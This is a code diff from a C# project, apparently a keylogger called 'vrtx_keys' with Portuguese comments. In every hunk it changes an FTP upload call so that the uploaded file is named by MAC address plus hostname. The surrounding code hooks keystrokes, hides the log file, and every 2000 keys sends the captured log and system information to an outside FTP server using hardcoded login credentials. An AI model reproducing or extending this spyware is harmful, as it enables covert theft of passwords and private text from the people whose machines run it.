@@ -52,7 +52,7 @@ namespace vrtx_keys {
             }
             else {
                 //Caso já exista um arquivo, primeiro fazemos upload para o ftp e limpamos o conteúdo do mesmo
-                NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", logFilepath, NetworkInteraction.GetMacAddress(), logUpload);
+                NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", logFilepath, NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName(), logUpload);
 
                 //Em seguida limpamos o arquivo de log
                 FileInfo logFile = new FileInfo(logFilepath); logFile.Attributes &= ~FileAttributes.Hidden; //Remove momentaneamente o atributo oculto do arquivo
@@ -75,7 +75,7 @@ namespace vrtx_keys {
 
             NetworkInteraction.GetExtraInfo();
             //Em seguida fazemos upload das informações do sistema atualizadas
-            NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", sysFilepath, NetworkInteraction.GetMacAddress(), sysUpload);
+            NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", sysFilepath, NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName(), sysUpload);
 
             return logFilepath;
         }
@@ -108,7 +108,7 @@ namespace vrtx_keys {
                 if(wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
                     if(charCounter == 2000) {
                         charCounter = 0;
-                        NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", FILEPATH, NetworkInteraction.GetMacAddress(), logUpload);
+                        NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", FILEPATH, NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName(), logUpload);
                     }
                     else charCounter++;
 
